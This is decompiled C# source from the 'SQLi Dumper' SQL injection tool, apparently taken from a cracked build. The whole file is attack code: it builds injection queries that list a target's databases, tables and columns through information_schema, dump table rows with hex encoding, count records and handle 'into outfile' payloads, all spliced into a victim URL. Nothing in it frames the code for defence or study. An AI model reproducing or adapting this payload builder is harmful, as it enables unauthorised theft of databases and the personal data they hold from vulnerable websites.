// Decompiled with JetBrains decompiler
// Type: DataBase.MySQLNoError
// Assembly: SQLi Dumper, Version=8.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFDD07D3-5737-4188-BACA-DE2D004C7CCF
// Assembly location: C:\Users\cole\Desktop\SQLi Dumper v8.5 [VeryClean]\SQLi v.8.5 VeryClean by Stephanny.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;

namespace DataBase
{
  public class MySQLNoError
  {
    public static string Info(
      string sTraject,
      MySQLCollactions oCollaction,
      bool bHexEncoded,
      List<string> lColumn,
      string sEndUrl = "")
    {
      string mySqlCollaction = Utls.GetMySQLCollaction(oCollaction);
      string newValue1 = Conversions.ToString(Interaction.IIf(bHexEncoded, (object) "hex(#)", (object) "#"));
      string newValue2 = "";
      string newValue3;
      if (sTraject.ToLower().Contains(" into outfile") | sTraject.ToLower().Contains(" into dumpfile"))
      {
        string newValue4 = lColumn[0].Trim();
        newValue3 = mySqlCollaction.Replace("#", newValue4);
      }
      else
      {
        int num = checked (lColumn.Count - 1);
        int index = 0;
        while (index <= num)
        {
          if (index > 0)
            newValue2 = newValue2 + "," + Globals.COLLUMNS_SPLIT + ",";
          string str = lColumn[index].Trim();
          newValue2 += str;
          checked { ++index; }
        }
        string str1 = mySqlCollaction.Replace("#", "concat(" + Globals.DATA_SPLIT + ",#," + Globals.DATA_SPLIT + ")").Replace("#", newValue1);
        newValue3 = lColumn.Count <= 1 ? str1.Replace("#", newValue2) : str1.Replace("#", "concat(" + newValue2 + ")");
      }
      return (sTraject.Replace("[t]", newValue3) + sEndUrl).Replace("  ", " ");
    }

    public static string DataBases(
      string sTraject,
      MySQLCollactions oCollaction,
      bool bHexEncoded,
      bool bCorrentDB,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      int limitX = 0,
      int limitY = 1)
    {
      string str1 = ("(select distinct " + Utls.GetMySQLCollaction(oCollaction)).Replace("#", "concat(" + Globals.DATA_SPLIT + ",#," + Globals.DATA_SPLIT + ")");
      string str2;
      string str3;
      if (limitX == -1)
      {
        str2 = str1.Replace("#", "group_concat(schema_name)");
        str3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) " from information_schema.schemata", Interaction.IIf(bCorrentDB, (object) (" where schema_name=database() and not schema_name=" + Globals.G_Utilities.ConvertTextToHex("information_schema")), (object) (" where not schema_name=" + Globals.G_Utilities.ConvertTextToHex("information_schema")))), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))));
      }
      else
      {
        str2 = str1.Replace("#", "schema_name");
        str3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" from information_schema.schemata where not schema_name=" + Globals.G_Utilities.ConvertTextToHex("information_schema")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) " limit "), (object) limitX), (object) ","), (object) limitY));
      }
      string newValue = str2 + str3 + ")";
      return (sTraject.Replace("[t]", newValue) + sEndUrl).Replace("  ", " ");
    }

    public static string Tables(
      string sTraject,
      MySQLCollactions oCollaction,
      string sDataBase,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      int limitX = 0,
      int limitY = 1)
    {
      string str1 = ("(select distinct " + Utls.GetMySQLCollaction(oCollaction)).Replace("#", "concat(" + Globals.DATA_SPLIT + ",#," + Globals.DATA_SPLIT + ")");
      string str2;
      string str3;
      if (limitX == -1)
      {
        str2 = str1.Replace("#", "group_concat(table_name)");
        str3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" from information_schema.tables where table_schema=" + Globals.G_Utilities.ConvertTextToHex(sDataBase)), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))));
      }
      else
      {
        str2 = str1.Replace("#", "table_name");
        str3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" from information_schema.tables where table_schema=" + Globals.G_Utilities.ConvertTextToHex(sDataBase)), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) " limit "), (object) limitX), (object) ","), (object) limitY));
      }
      string newValue = str2 + str3 + ")";
      return (sTraject.Replace("[t]", newValue) + sEndUrl).Replace("  ", " ");
    }

    public static string Columns(
      string sTraject,
      MySQLCollactions oCollaction,
      string sDataBase,
      string sTable,
      bool bDataType,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      int limitX = 0,
      int limitY = 1)
    {
      string str1 = ("(select distinct " + Utls.GetMySQLCollaction(oCollaction)).Replace("#", "concat(" + Globals.DATA_SPLIT + ",#," + Globals.DATA_SPLIT + ")");
      string str2;
      string str3;
      if (limitX == -1)
      {
        str2 = str1.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "group_concat(column_name", Interaction.IIf(bDataType, (object) ",0x3a,replace(column_type,0x2c,0x3b)", (object) "")), (object) ")")));
        str3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" from information_schema.columns where table_schema=" + Globals.G_Utilities.ConvertTextToHex(sDataBase) + " and table_name=" + Globals.G_Utilities.ConvertTextToHex(sTable)), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))));
      }
      else
      {
        str2 = str1.Replace("#", Conversions.ToString(Operators.ConcatenateObject((object) "column_name", Interaction.IIf(bDataType, (object) ",0x3a,column_type", (object) ""))));
        str3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" from information_schema.columns where table_schema=" + Globals.G_Utilities.ConvertTextToHex(sDataBase) + " and table_name=" + Globals.G_Utilities.ConvertTextToHex(sTable)), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) " limit "), (object) limitX), (object) ","), (object) limitY));
      }
      string newValue = str2 + str3 + ")";
      return (sTraject.Replace("[t]", newValue) + sEndUrl).Replace("  ", " ");
    }

    public static string Dump(
      string sTraject,
      MySQLCollactions oCollaction,
      bool bHexEncoded,
      bool bIFNULL,
      string sDataBase,
      string sTable,
      List<string> lColumn,
      int limitX,
      int limitY = 1,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      string sCustomQuery = "")
    {
      string mySqlCollaction = Utls.GetMySQLCollaction(oCollaction);
      string newValue1 = Conversions.ToString(Interaction.IIf(bHexEncoded, (object) "hex(concat(#))", (object) "#"));
      string str1 = Conversions.ToString(Interaction.IIf(false, (object) "group_concat(#)", (object) "concat(#)"));
      string str2 = Conversions.ToString(Interaction.IIf(bIFNULL, (object) ("ifnull(#,char(" + Conversions.ToString(32) + "))"), (object) "#"));
      string str3 = ("(select " + mySqlCollaction).Replace("#", str1.Replace("#", Globals.DATA_SPLIT + ",#," + Globals.DATA_SPLIT)).Replace("#", newValue1);
      string newValue2 = "";
      int num = checked (lColumn.Count - 1);
      int index = 0;
      while (index <= num)
      {
        if (index > 0)
          newValue2 = newValue2 + "," + Globals.COLLUMNS_SPLIT + ",";
        string str4 = str2.Replace("#", lColumn[index].Trim());
        newValue2 += str4;
        checked { ++index; }
      }
      string newValue3 = str3.Replace("#", newValue2) + " " + (!(!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable)) ? sCustomQuery.Trim().Replace("[x]", Conversions.ToString(limitX)).Replace("[y]", Conversions.ToString(limitY)) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" from " + sDataBase + "." + sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" where " + sWhere))), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), (object) "", (object) (" order by " + sOrderBy))), (object) " limit "), (object) limitX), (object) ","), (object) limitY))) + ")";
      return (sTraject.Replace("[t]", newValue3) + sEndUrl).Replace("  ", " ");
    }

    public static string Count(
      string sTraject,
      MySQLCollactions oCollaction,
      Schema o,
      string sDataBase,
      string sTable,
      string sWhere = "",
      string sEndUrl = "")
    {
      string str1 = "";
      string str2 = ("(select " + Utls.GetMySQLCollaction(oCollaction)).Replace("#", "concat(" + Globals.DATA_SPLIT + ",count(0)," + Globals.DATA_SPLIT + ")");
      switch (o)
      {
        case Schema.DATABASES:
          str1 = Conversions.ToString(Operators.ConcatenateObject((object) (" from information_schema.schemata where not schema_name=" + Globals.G_Utilities.ConvertTextToHex("information_schema")), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))));
          break;
        case Schema.TABLES:
          str1 = Conversions.ToString(Operators.ConcatenateObject((object) (" from information_schema.tables where table_schema=" + Globals.G_Utilities.ConvertTextToHex(sDataBase)), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))));
          break;
        case Schema.COLUMNS:
          str1 = Conversions.ToString(Operators.ConcatenateObject((object) (" from information_schema.columns where table_schema=" + Globals.G_Utilities.ConvertTextToHex(sDataBase) + " and table_name=" + Globals.G_Utilities.ConvertTextToHex(sTable)), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" and " + sWhere))));
          break;
        case Schema.ROWS:
          str1 = Conversions.ToString(Operators.ConcatenateObject((object) (" from " + sDataBase + "." + sTable), Interaction.IIf(string.IsNullOrEmpty(sWhere), (object) "", (object) (" where " + sWhere))));
          break;
      }
      string newValue = str2 + str1 + ")";
      return (sTraject.Replace("[t]", newValue) + sEndUrl).Replace("  ", " ");
    }
  }
}
